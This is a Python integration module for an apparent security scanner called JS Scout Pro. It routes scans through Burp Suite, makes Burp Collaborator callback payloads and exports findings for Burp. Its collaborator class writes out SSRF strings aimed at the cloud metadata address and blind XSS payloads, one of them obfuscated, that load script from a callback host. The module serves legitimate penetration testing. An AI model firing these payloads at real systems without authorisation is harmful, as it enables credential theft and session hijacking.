#!/usr/bin/env python3
"""
burp_integration.py — JS Scout Pro Burp Suite Integration
==========================================================
Provides:
  1. Burp Proxy routing   — send all scanner requests through Burp (127.0.0.1:8080)
  2. Burp Collaborator    — OOB detection for blind SSRF, blind XSS, blind CMDi
  3. Request export       — dump raw HTTP requests to files importable by Burp
  4. Repeater helper      — format findings as curl/Burp repeater-ready PoCs
  5. Extension hints      — recommend Burp extensions per finding type

Usage:
    from burp_integration import BurpConfig, BurpCollaborator, BurpExporter

    # Route scanner through Burp proxy
    cfg = BurpConfig(proxy_host='127.0.0.1', proxy_port=8080)
    session = cfg.make_session()

    # Use collaborator polling for OOB
    collab = BurpCollaborator(api_url='http://127.0.0.1:1337')
    payload = collab.get_payload('ssrf')
    ...
    hits = collab.poll()

    # Export findings
    exporter = BurpExporter(output_dir='output/burp_export')
    exporter.export_finding(finding)
"""

import re
import json
import time
import uuid
import socket
import logging
import threading
from pathlib import Path
from urllib.parse import urlparse, urlencode, quote
from datetime import datetime

try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    raise ImportError("[!] pip install requests")

log = logging.getLogger('jsscout.burp')


# ─── Burp extension recommendations ──────────────────────────────────────────

BURP_EXTENSION_MAP = {
    'IDOR':                   ['Autorize', 'Authmatrix'],
    'BROKEN_ACCESS_CONTROL':  ['Autorize', 'Authmatrix'],
    'SQL_INJECTION':          ['SQLipy', 'CO2'],
    'XSS':                    ['XSS Validator', 'DOM Invader'],
    'SSRF':                   ['Collaborator Everywhere', 'SSRF King'],
    'COMMAND_INJECTION':      ['Collaborator Everywhere'],
    'PATH_TRAVERSAL':         ['Backslash Powered Scanner'],
    'SSTI':                   ['Backslash Powered Scanner'],
    'MISSING_PARAMS':         ['Param Miner', 'GAP'],
    'CORS':                   ['CORS*', 'Additional Scanner Checks'],
    'JWT':                    ['JWT Editor', 'JSON Web Tokens'],
    'CACHE_POISONING':        ['Param Miner', 'Web Cache Deception Scanner'],
    'REQUEST_SMUGGLING':      ['HTTP Request Smuggler'],
    'OAUTH':                  ['OAuth Scanner', 'TokenJacking'],
    'GRAPHQL':                ['InQL', 'GraphQL Raider'],
    'XXE':                    ['Content Type Converter'],
    'DEFAULT':                ['Active Scan++', 'Backslash Powered Scanner', 'Param Miner'],
}


def get_recommended_extensions(finding_type: str) -> list:
    """Return Burp extension names relevant to a finding type."""
    key = finding_type.upper()
    for pattern, exts in BURP_EXTENSION_MAP.items():
        if pattern in key:
            return exts
    return BURP_EXTENSION_MAP['DEFAULT']


# =============================================================================
# BURP PROXY CONFIGURATION
# =============================================================================

class BurpConfig:
    """
    Configure a requests.Session to route through Burp Suite proxy.
    Also handles certificate trust for HTTPS interception.
    """

    def __init__(self,
                 proxy_host: str = '127.0.0.1',
                 proxy_port: int = 8080,
                 verify_burp_cert: bool = False,
                 burp_cert_path: str = None):
        self.proxy_host       = proxy_host
        self.proxy_port       = proxy_port
        self.verify_burp_cert = verify_burp_cert
        self.burp_cert_path   = burp_cert_path
        self.proxy_url        = f'http://{proxy_host}:{proxy_port}'

    def is_burp_running(self) -> bool:
        """Check if Burp proxy is reachable."""
        try:
            sock = socket.create_connection((self.proxy_host, self.proxy_port), timeout=2)
            sock.close()
            return True
        except Exception:
            return False

    def make_session(self, base_session: requests.Session = None) -> requests.Session:
        """
        Return a requests.Session pre-configured to route through Burp.
        If base_session provided, patches it in-place and returns it.
        """
        session = base_session or requests.Session()
        session.proxies = {
            'http':  self.proxy_url,
            'https': self.proxy_url,
        }
        if self.burp_cert_path:
            session.verify = self.burp_cert_path
        else:
            session.verify = False

        log.info(f"[Burp] Routing through proxy {self.proxy_url}")
        return session

    def patch_existing_session(self, session: requests.Session) -> requests.Session:
        """Non-destructively add proxy config to an existing session."""
        session.proxies = {
            'http':  self.proxy_url,
            'https': self.proxy_url,
        }
        session.verify = False
        return session


# =============================================================================
# BURP COLLABORATOR CLIENT
# =============================================================================

class BurpCollaborator:
    """
    Interact with Burp Collaborator for OOB (out-of-band) detection.

    Supports two modes:
    1. Real Collaborator API (Burp Professional with polling API on port 1337)
    2. Canary mode — generate unique DNS labels, detect via DNS resolution
       (fallback when real Collaborator isn't available)

    Real Collaborator setup:
      - Start Burp Professional
      - Enable Burp Collaborator server
      - Note the collaborator domain (e.g. burpcollaborator.net)
      - The polling API is available at http://127.0.0.1:1337/burpresults

    Canary mode:
      - Generate a unique subdomain per payload
      - Point your own DNS resolver to log queries
      - Check logs manually after scan
    """

    def __init__(self,
                 collab_domain: str = None,
                 api_url: str = 'http://127.0.0.1:1337',
                 mode: str = 'canary'):
        """
        Args:
            collab_domain: Collaborator domain (e.g. 'xxxx.burpcollaborator.net')
            api_url:       Burp Collaborator polling API URL
            mode:          'real' for Burp Pro, 'canary' for DNS-label mode
        """
        self.collab_domain = collab_domain or 'jsscout.burpcollaborator.net'
        self.api_url       = api_url.rstrip('/')
        self.mode          = mode
        self._payloads     = {}   # id → {'type': str, 'generated_at': float}
        self._lock         = threading.Lock()

    def get_payload(self, check_type: str = 'generic') -> dict:
        """
        Generate a unique collaborator payload for a specific check.
        Returns dict with 'domain', 'url', 'id', 'label'.
        """
        label = f"jsscout-{check_type[:6]}-{uuid.uuid4().hex[:8]}"
        full_domain = f"{label}.{self.collab_domain}"

        with self._lock:
            self._payloads[label] = {
                'type':         check_type,
                'generated_at': time.time(),
                'domain':       full_domain,
            }

        return {
            'id':     label,
            'domain': full_domain,
            'url':    f'http://{full_domain}',
            'https':  f'https://{full_domain}',
            'label':  label,
            # Common injection formats
            'payloads': {
                'url':      f'http://{full_domain}',
                'ssrf':     f'http://{full_domain}/ssrf-test',
                'xxe':      f'http://{full_domain}/xxe-test',
                'blind_xss': f'"><script src="http://{full_domain}/bxss.js"></script>',
                'email':    f'test@{full_domain}',
                'ftp':      f'ftp://{full_domain}',
                'dns':      full_domain,
            }
        }

    def poll(self, max_age_seconds: int = 300) -> list:
        """
        Poll Burp Collaborator API for OOB interactions.
        Returns list of interaction dicts.
        Only available in 'real' mode with Burp Pro.
        """
        if self.mode != 'real':
            return []

        try:
            r = requests.get(
                f'{self.api_url}/burpresults',
                params={'biid': 'all'},
                timeout=10,
                verify=False,
            )
            if r.status_code != 200:
                return []

            data = r.json()
            responses = data.get('responses', [])
            hits = []
            cutoff = time.time() - max_age_seconds

            for resp in responses:
                ts = resp.get('time', 0)
                if ts < cutoff:
                    continue
                # Match back to our generated payload IDs
                domain = resp.get('client', {}).get('ip', '')
                interaction_type = resp.get('type', 'unknown')
                interaction_domain = resp.get('interactionString', '')

                for label, info in self._payloads.items():
                    if label in interaction_domain:
                        hits.append({
                            'label':            label,
                            'check_type':       info['type'],
                            'interaction_type': interaction_type,
                            'domain':           interaction_domain,
                            'from_ip':          domain,
                            'timestamp':        ts,
                        })
                        break
            return hits

        except Exception as e:
            log.debug(f"[Burp Collaborator] Poll failed: {e}")
            return []

    def get_ssrf_payloads(self) -> list:
        """Return a list of collaborator-based SSRF payloads."""
        p = self.get_payload('ssrf')
        return [
            p['payloads']['url'],
            p['payloads']['ssrf'],
            f"http://{p['domain']}@169.254.169.254/",
            f"http://169.254.169.254@{p['domain']}/",
        ]

    def get_blind_xss_payloads(self) -> list:
        """Return blind XSS payloads that call back to collaborator."""
        p = self.get_payload('blind_xss')
        domain = p['domain']
        return [
            f'"><script src="http://{domain}/bxss.js"></script>',
            f"'><img src=x onerror=\"var s=document.createElement('script');s.src='http://{domain}/bxss.js';document.head.appendChild(s)\">",
            f'javascript:eval(String.fromCharCode(118,97,114,32,115,61,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,59,115,46,115,114,99,61,39,104,116,116,112,58,47,47)+\'{domain}/bxss.js\')',
            f'<iframe src="http://{domain}/bxss" style="display:none">',
        ]


# =============================================================================
# BURP REQUEST EXPORTER
# =============================================================================

class BurpExporter:
    """
    Export scanner findings as:
    - Raw HTTP requests (importable into Burp Repeater)
    - curl commands (for manual verification)
    - Burp XML format (importable into Burp via Proxy > HTTP history)
    """

    def __init__(self, output_dir: str = 'output/burp_export'):
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self._exported = []

    def export_finding(self, finding: dict, request_data: dict = None) -> str:
        """
        Export a single finding as a raw HTTP request file + curl command.
        Returns path to the exported file.
        """
        ftype   = finding.get('type', 'UNKNOWN').replace('/', '_')
        url     = finding.get('url', finding.get('base_url', ''))
        param   = finding.get('param', '')
        payload = finding.get('payload', '')
        sev     = finding.get('severity', 'MEDIUM')

        ts      = datetime.now().strftime('%Y%m%d_%H%M%S')
        uid     = uuid.uuid4().hex[:6]
        name    = f"{sev}_{ftype}_{uid}"

        # Build raw HTTP request
        raw = self._build_raw_request(url, param, payload, finding, request_data)

        # Write raw request
        raw_path = self.output_dir / f"{name}.http"
        raw_path.write_text(raw, encoding='utf-8')

        # Write curl equivalent
        curl = self._build_curl(url, param, payload, finding, request_data)
        curl_path = self.output_dir / f"{name}.sh"
        curl_path.write_text(curl, encoding='utf-8')

        # Write finding JSON
        finding_path = self.output_dir / f"{name}.json"
        finding_path.write_text(json.dumps(finding, indent=2, default=str), encoding='utf-8')

        self._exported.append({'name': name, 'finding': finding, 'paths': {
            'http': str(raw_path), 'curl': str(curl_path), 'json': str(finding_path)
        }})

        log.debug(f"[Burp Export] {name} → {raw_path}")
        return str(raw_path)

    def export_all(self, findings_list: list) -> str:
        """Export all findings and generate an index file. Returns index path."""
        for finding in findings_list:
            self.export_finding(finding)

        # Burp XML export
        xml = self._build_burp_xml(findings_list)
        xml_path = self.output_dir / 'burp_import.xml'
        xml_path.write_text(xml, encoding='utf-8')

        # Index
        index = {
            'exported_at': datetime.now().isoformat(),
            'total':       len(self._exported),
            'files':       self._exported,
            'burp_xml':    str(xml_path),
        }
        idx_path = self.output_dir / 'index.json'
        idx_path.write_text(json.dumps(index, indent=2, default=str), encoding='utf-8')

        log.info(f"[Burp Export] {len(self._exported)} findings → {self.output_dir}")
        return str(idx_path)

    def _build_raw_request(self, url, param, payload, finding, extra=None) -> str:
        """Build a raw HTTP/1.1 request string."""
        parsed = urlparse(url)
        host   = parsed.netloc or parsed.path
        path   = parsed.path or '/'
        if parsed.query:
            path += '?' + parsed.query

        method = (extra or {}).get('method', 'GET').upper()
        body   = (extra or {}).get('body', '')

        headers = [
            f"{method} {path} HTTP/1.1",
            f"Host: {host}",
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language: en-US,en;q=0.5",
            "Accept-Encoding: gzip, deflate",
            "Connection: close",
        ]

        if (extra or {}).get('cookies'):
            headers.append(f"Cookie: {extra['cookies']}")
        if (extra or {}).get('auth'):
            headers.append(f"Authorization: {extra['auth']}")
        if body:
            headers.append(f"Content-Length: {len(body)}")
            headers.append("Content-Type: application/x-www-form-urlencoded")

        lines = '\r\n'.join(headers) + '\r\n\r\n'
        if body:
            lines += body

        comment = (
            f"# Finding: {finding.get('type','?')} [{finding.get('severity','?')}]\n"
            f"# Description: {finding.get('description','')}\n"
            f"# Evidence: {finding.get('evidence','')}\n"
            f"# Remediation: {finding.get('remediation','')}\n"
            f"# Extensions: {', '.join(get_recommended_extensions(finding.get('type',''))[:3])}\n\n"
        )
        return comment + lines

    def _build_curl(self, url, param, payload, finding, extra=None) -> str:
        """Build a curl command for the finding."""
        method  = (extra or {}).get('method', 'GET').upper()
        body    = (extra or {}).get('body', '')
        cookies = (extra or {}).get('cookies', '')
        auth    = (extra or {}).get('auth', '')

        parts = [f"curl -v -k '{url}'"]
        if method != 'GET':
            parts.append(f"-X {method}")
        if body:
            parts.append(f"-d '{body}'")
        if cookies:
            parts.append(f"-H 'Cookie: {cookies}'")
        if auth:
            parts.append(f"-H 'Authorization: {auth}'")
        parts.append("-H 'User-Agent: Mozilla/5.0 (compatible; JSScoutPro)'")

        cmd = ' \\\n  '.join(parts)
        return (
            f"#!/bin/bash\n"
            f"# Finding: {finding.get('type','?')} [{finding.get('severity','?')}]\n"
            f"# {finding.get('description','')}\n\n"
            f"{cmd}\n"
        )

    def _build_burp_xml(self, findings: list) -> str:
        """Build Burp Suite XML import format."""
        items = []
        for f in findings:
            url  = f.get('url', f.get('base_url', ''))
            host = urlparse(url).netloc if url else ''
            items.append(f"""  <item>
    <time>{datetime.now().strftime('%a %b %d %H:%M:%S UTC %Y')}</time>
    <url><![CDATA[{url}]]></url>
    <host ip="">{host}</host>
    <port>443</port>
    <protocol>https</protocol>
    <method>GET</method>
    <path><![CDATA[{urlparse(url).path}]]></path>
    <extension/>
    <request base64="false"><![CDATA[GET {urlparse(url).path} HTTP/1.1\r\nHost: {host}\r\n\r\n]]></request>
    <status>200</status>
    <responselength>0</responselength>
    <mimetype>text/html</mimetype>
    <response base64="false"><![CDATA[]]></response>
    <comment><![CDATA[{f.get('type','?')} [{f.get('severity','?')}] — {f.get('description','')}]]></comment>
  </item>""")

        return f"""<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE items [
  <!ELEMENT items (item*)>
  <!ELEMENT item (time, url, host, port, protocol, method, path, extension, request, status, responselength, mimetype, response, comment)>
]>
<items burpVersion="2024.1" exportTime="{datetime.now().isoformat()}">
{''.join(items)}
</items>
"""

    def format_for_repeater(self, finding: dict) -> str:
        """Format a finding as a Burp Repeater-ready request string."""
        url = finding.get('url', finding.get('base_url', ''))
        return self._build_raw_request(url, finding.get('param',''),
                                       finding.get('payload',''), finding)


# =============================================================================
# BURP INTEGRATION MANAGER (main interface)
# =============================================================================

class BurpManager:
    """
    High-level manager that coordinates proxy routing, collaborator,
    and export functionality.
    """

    def __init__(self, config: dict = None):
        cfg = config or {}

        self.enabled       = cfg.get('enabled', False)
        self.proxy_host    = cfg.get('proxy_host', '127.0.0.1')
        self.proxy_port    = cfg.get('proxy_port', 8080)
        self.collab_domain = cfg.get('collab_domain', '')
        self.collab_api    = cfg.get('collab_api', 'http://127.0.0.1:1337')
        self.collab_mode   = cfg.get('collab_mode', 'canary')
        self.export_dir    = cfg.get('export_dir', 'output/burp_export')
        self.export_findings = cfg.get('export_findings', True)

        self._proxy_cfg  = BurpConfig(self.proxy_host, self.proxy_port) if self.enabled else None
        self._collab     = BurpCollaborator(self.collab_domain, self.collab_api, self.collab_mode)
        self._exporter   = BurpExporter(self.export_dir)

    @classmethod
    def from_args(cls, args) -> 'BurpManager':
        """Create from argparse namespace."""
        cfg = {
            'enabled':        getattr(args, 'burp', False),
            'proxy_host':     getattr(args, 'burp_host', '127.0.0.1'),
            'proxy_port':     getattr(args, 'burp_port', 8080),
            'collab_domain':  getattr(args, 'collab_domain', ''),
            'collab_mode':    'real' if getattr(args, 'collab_domain', '') else 'canary',
            'export_findings': True,
        }
        return cls(cfg)

    def is_active(self) -> bool:
        return self.enabled

    def check_proxy(self) -> bool:
        if not self.enabled:
            return False
        ok = self._proxy_cfg.is_burp_running()
        if not ok:
            log.warning(f"[Burp] Proxy not reachable at {self.proxy_host}:{self.proxy_port}")
        return ok

    def patch_session(self, session: requests.Session) -> requests.Session:
        """Optionally route session through Burp proxy."""
        if self.enabled and self._proxy_cfg:
            return self._proxy_cfg.patch_existing_session(session)
        return session

    def get_collab_payload(self, check_type: str) -> dict:
        return self._collab.get_payload(check_type)

    def get_blind_xss_payloads(self) -> list:
        return self._collab.get_blind_xss_payloads()

    def get_ssrf_payloads(self) -> list:
        return self._collab.get_ssrf_payloads()

    def poll_collab(self) -> list:
        return self._collab.poll()

    def export_finding(self, finding: dict):
        if self.export_findings:
            self._exporter.export_finding(finding)

    def export_all_findings(self, findings: list) -> str:
        return self._exporter.export_all(findings)

    def get_extension_hints(self, finding_type: str) -> list:
        return get_recommended_extensions(finding_type)

    def summary(self) -> dict:
        return {
            'proxy_enabled':  self.enabled,
            'proxy_addr':     f"{self.proxy_host}:{self.proxy_port}" if self.enabled else None,
            'proxy_reachable': self.check_proxy() if self.enabled else None,
            'collab_mode':    self.collab_mode,
            'collab_domain':  self.collab_domain or 'canary (not configured)',
            'export_dir':     self.export_dir,
        }
